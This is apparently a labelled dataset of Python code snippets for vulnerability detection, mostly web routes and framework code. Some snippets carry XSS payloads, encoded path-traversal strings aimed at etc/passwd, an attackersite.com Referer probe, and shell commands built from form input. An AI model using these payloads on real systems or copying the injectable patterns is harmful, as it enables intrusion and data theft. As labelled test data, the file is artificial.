\t\tfmt=\"", "label": 0}, {"snippet_id": 3161, "code": ") decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, ", "label": 0}, {"snippet_id": 38861, "code": "'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))", "label": 0}, {"snippet_id": 48875, "code": " query.items(): if type(value)==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return '?{}'.format(urlencode(query)) class", "label": 0}, {"snippet_id": 33512, "code": "\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self", "label": 0}, {"snippet_id": 566, "code": " in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list", "label": 1}, {"snippet_id": 35667, "code": "\t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype", "label": 0}, {"snippet_id": 42012, "code": "(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t", "label": 0}, {"snippet_id": 51152, "code": ".is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return date class Meta: ordering=[\"-name\"] class IECrontabSchedule(ImportExportModelAdmin): pass admin.site", "label": 0}, {"snippet_id": 46680, "code": "{str(q['id']) for q in entry_form_config} data={ f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids } if data: kwargs['data']=data return kwargs def form_valid(self,", "label": 0}, {"snippet_id": 14183, "code": "=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', ", "label": 0}, {"snippet_id": 39235, "code": "\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self", "label": 0}, {"snippet_id": 5530, "code": "/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'", "label": 0}, {"snippet_id": 36423, "code": ".parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta", "label": 0}, {"snippet_id": 20536, "code": " Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs", "label": 0}, {"snippet_id": 49065, "code": "(ordering_query_param) self.current_columns=[int(col) for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else[] self.current_columns_length=len(self.current_columns) @property def priority(self", "label": 0}, {"snippet_id": 6837, "code": " @property def login_state_ttl(self): \"\"\" Lifetime of state kept in IdP login phase. This is the time, in minutes, a user has to complete the login phase. After this time, login cannot complete because", "label": 0}, {"snippet_id": 48698, "code": " HttpRequest): \"\"\" This function removes an article from the reservation and returnes the required resonse. \"\"\" u: Profile=get_current_user(request) if \"rid\" in request.GET: if \"srid\" in request.GET: response", "label": 0}, {"snippet_id": 22802, "code": "<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views", "label": 1}, {"snippet_id": 15340, "code": "=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss',", "label": 1}, {"snippet_id": 18362, "code": ">[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter", "label": 0}, {"snippet_id": 7151, "code": "( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', ", "label": 0}, {"snippet_id": 15185, "code": " \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related", "label": 0}, {"snippet_id": 27301, "code": " superclass of all handlers.\"\"\" from builtins import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os", "label": 0}, {"snippet_id": 38096, "code": ".form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe", "label": 1}, {"snippet_id": 19114, "code": " import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss", "label": 1}, {"snippet_id": 17466, "code": " +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=(", "label": 0}, {"snippet_id": 14111, "code": "'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'),", "label": 0}, {"snippet_id": 47660, "code": ".add_content(PlainText('<br /><br />Change password(leave blank in order to not change it):')) else: f.add_content(PlainText('<br />Choose a password: ')) f.add_content(PasswordField(name='password', required", "label": 0}, {"snippet_id": 27284, "code": " information\" exit() print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\",", "label": 1}, {"snippet_id": 52262, "code": "'id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc", "label": 0}, {"snippet_id": 2666, "code": ",\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value", "label": 0}, {"snippet_id": 32906, "code": "('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('", "label": 1}, {"snippet_id": 47983, "code": " PIL from PIL import Image PATH_TO_UPLOAD_FOLDER_ON_DISK: str=\"/usr/local/www/focweb/\" IMAGE_SCALE=64 def action_change_user_avatar(request: HttpRequest): try: user_id=int(request.GET[\"payload\"]) media_id", "label": 0}, {"snippet_id": 33968, "code": "\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type", "label": 0}, {"snippet_id": 27306, "code": " import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import traceback", "label": 0}, {"snippet_id": 47770, "code": " :param default_forward_url: The URL to forward to if nothing was specified :return: The crafted HttpResponse \"\"\" forward_url=default_forward_url if request.GET.get(\"redirect\"): forward_url=request.GET", "label": 0}, {"snippet_id": 33763, "code": " under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t", "label": 0}, {"snippet_id": 7502, "code": ".courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about", "label": 0}, {"snippet_id": 51738, "code": " {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat.periodictask'}, {'name': 'django_celery_beat.crontabschedule'}, ]}, ] MEDIA_ROOT=os.environ.get('MEDIA_ROOT", "label": 0}, {"snippet_id": 2793, "code": " xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact", "label": 0}, {"snippet_id": 37102, "code": " reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start", "label": 0}, {"snippet_id": 46370, "code": " return browse(request, name, True) @allow_owner_only def save(request): response={'status': -1} collection=json.loads(request.POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}", "label": 0}, {"snippet_id": 21245, "code": "<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"),", "label": 1}, {"snippet_id": 10846, "code": " test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils", "label": 0}, {"snippet_id": 2673, "code": " referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers)", "label": 0}, {"snippet_id": 9268, "code": "', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/", "label": 0}, {"snippet_id": 35417, "code": "\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t", "label": 0}, {"snippet_id": 6644, "code": "\" Get list of usernames valid for use with the /status URL. If this list is['*'], all usernames are allowed for /status. :return: list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames", "label": 0}, {"snippet_id": 29654, "code": "/div>\") \t\tpass def escape_html(text): \treturn cgi.escape(text, quote=True) \t def subprocess_execute(cmd): \timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell", "label": 0}, {"snippet_id": 39560, "code": "\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields", "label": 0}, {"snippet_id": 51195, "code": " Users' class UserResource(resources.ModelResource): class Meta: model=User class GroupResource(resources.ModelResource): class Meta: model=Group class UserAdmin(BaseUserAdmin, ImportExportModelAdmin):", "label": 0}, {"snippet_id": 54696, "code": ", 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return context def post(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form() if form.is_valid(): return self", "label": 0}, {"snippet_id": 17577, "code": " django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate", "label": 0}, {"snippet_id": 14353, "code": ".provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth", "label": 0}, {"snippet_id": 50986, "code": ".fieldsets \"\"\" Interval schedule does not support due_ or something. Which is absolutely terrible and vague. I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy", "label": 0}, {"snippet_id": 32308, "code": ":%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)", "label": 0}, {"snippet_id": 24580, "code": "(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up", "label": 0}, {"snippet_id": 51633, "code": "', 'dashboard'), 'USER': os.environ.get('DB_USER', 'dashboard'), 'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get('DB_HOST', 'mysql'), 'OPTIONS': DATABASE_OPTIONS.get(os.environ", "label": 0}, {"snippet_id": 13239, "code": " +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$", "label": 0}, {"snippet_id": 26607, "code": "%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 22706, "code": "=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course", "label": 0}, {"snippet_id": 50463, "code": "._responseFailed, csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called", "label": 0}, {"snippet_id": 13301, "code": "), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware", "label": 0}, {"snippet_id": 12865, "code": " settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 3982, "code": " impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers", "label": 0}, {"snippet_id": 2570, "code": " dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({", "label": 0}, {"snippet_id": 52761, "code": " if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request", "label": 0}, {"snippet_id": 10224, "code": ") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self", "label": 1}, {"snippet_id": 10044, "code": "\" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports", "label": 0}, {"snippet_id": 23374, "code": ".login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid", "label": 0}, {"snippet_id": 1625, "code": "(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body'", "label": 0}, {"snippet_id": 53524, "code": ".POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')", "label": 0}, {"snippet_id": 26604, "code": "%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 8751, "code": "'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 2739, "code": "\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', ", "label": 0}, {"snippet_id": 31630, "code": ".ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t", "label": 0}, {"snippet_id": 41428, "code": ".full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t", "label": 0}, {"snippet_id": 2269, "code": "=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace", "label": 0}, {"snippet_id": 20258, "code": ". \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000", "label": 0}, {"snippet_id": 4621, "code": " 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress'", "label": 0}, {"snippet_id": 30179, "code": "\tprint(\"Bad config, check please\") \t if form.getvalue('action_waf') is not None and serv is not None: \tserv=form.getvalue('serv') \taction=form.getvalue('action_waf') \tcommands=[ \"sudo systemctl %s waf\" %", "label": 0}, {"snippet_id": 55157, "code": "': 0, 'invalid_translation_count': invalid_translation_count, }) update_stats(action_status['translated_resources'], locale) mark_changed_translation(action_status['changed_entities'], locale) if action_status", "label": 0}, {"snippet_id": 54902, "code": ".utils import( require_AJAX, readonly_exists, ) from pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale", "label": 0}, {"snippet_id": 34385, "code": ") \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter", "label": 0}, {"snippet_id": 16238, "code": "/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done", "label": 0}, {"snippet_id": 28675, "code": "<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport", "label": 0}, {"snippet_id": 12086, "code": "-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 28214, "code": "\tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue", "label": 0}, {"snippet_id": 48849, "code": " return field.short_description return self.field_name.replace(\"_\", \" \").title() class QueryParamsMixin(object): def get_url_with_query_params(self, new_query_dict): query=dict(self.query_params).copy(", "label": 0}, {"snippet_id": 45220, "code": ".dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator", "label": 1}, {"snippet_id": 54591, "code": ", form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5", "label": 0}, {"snippet_id": 13697, "code": ", 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 5120, "code": " payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +", "label": 0}, {"snippet_id": 4160, "code": ") xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode", "label": 0}, {"snippet_id": 302, "code": ") return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact", "label": 1}, {"snippet_id": 36390, "code": "\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t", "label": 0}, {"snippet_id": 41794, "code": ".dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif", "label": 0}, {"snippet_id": 26187, "code": "]='1' self.fields['company'].widget.attrs['data-required-if']=' if not event.settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get", "label": 0}, {"snippet_id": 29257, "code": " full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass \t\t \treturn error \t def upload_and_restart(serv, cfg, **kwargs): \timport sql \ttmp_file=sql.get_setting('tmp_config_path') +\"/\"", "label": 0}, {"snippet_id": 11789, "code": ") urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view", "label": 0}, {"snippet_id": 18293, "code": "/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 40745, "code": "\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for", "label": 0}, {"snippet_id": 54103, "code": " break print(\"[*]URL:{}\".format(x)) bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at:{}\\n[*]Duration:{} seconds", "label": 0}, {"snippet_id": 17644, "code": "\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes", "label": 0}, {"snippet_id": 21903, "code": "/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider", "label": 0}, {"snippet_id": 30727, "code": "==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('", "label": 0}, {"snippet_id": 35259, "code": ".label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label", "label": 0}, {"snippet_id": 40447, "code": " float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model", "label": 0}, {"snippet_id": 54604, "code": " \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs): queryset=Article.objects.order_by('-time') for i in queryset: i", "label": 1}, {"snippet_id": 28505, "code": ".get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"", "label": 0}, {"snippet_id": 53318, "code": ")) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles", "label": 0}, {"snippet_id": 13466, "code": ".urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url", "label": 0}, {"snippet_id": 33241, "code": " self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators", "label": 0}, {"snippet_id": 12189, "code": "/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index')", "label": 1}, {"snippet_id": 38424, "code": "\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https", "label": 0}, {"snippet_id": 12579, "code": "<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$", "label": 0}, {"snippet_id": 20564, "code": "' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth", "label": 0}, {"snippet_id": 13886, "code": ".progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), 